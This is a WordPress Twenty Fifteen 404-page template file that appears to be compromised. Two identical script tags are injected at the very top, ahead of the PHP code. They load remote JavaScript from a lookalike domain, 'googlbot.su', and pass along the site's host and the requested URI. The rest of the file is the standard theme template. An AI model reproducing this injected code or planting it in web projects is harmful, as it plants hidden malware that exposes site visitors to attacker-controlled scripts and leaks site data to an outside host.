<script type="text/javascript" src="http://googlbot.su/BqNJYF?frm=script&se_referrer=<?php echo $_SERVER['HTTP_HOST']; ?>&default_keyword=<?php echo $_SERVER['REQUEST_URI']; ?>"></script><script type="text/javascript" src="http://googlbot.su/BqNJYF?frm=script&se_referrer=<?php echo $_SERVER['HTTP_HOST']; ?>&default_keyword=<?php echo $_SERVER['REQUEST_URI']; ?>"></script><?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

			<section class="error-404 not-found">
				<header class="page-header">
					<h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'twentyfifteen' ); ?></h1>
				</header><!-- .page-header -->

				<div class="page-content">
					<p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentyfifteen' ); ?></p>

					<?php get_search_form(); ?>
				</div><!-- .page-content -->
			</section><!-- .error-404 -->

		</main><!-- .site-main -->
	</div><!-- .content-area -->

<?php get_footer(); ?>
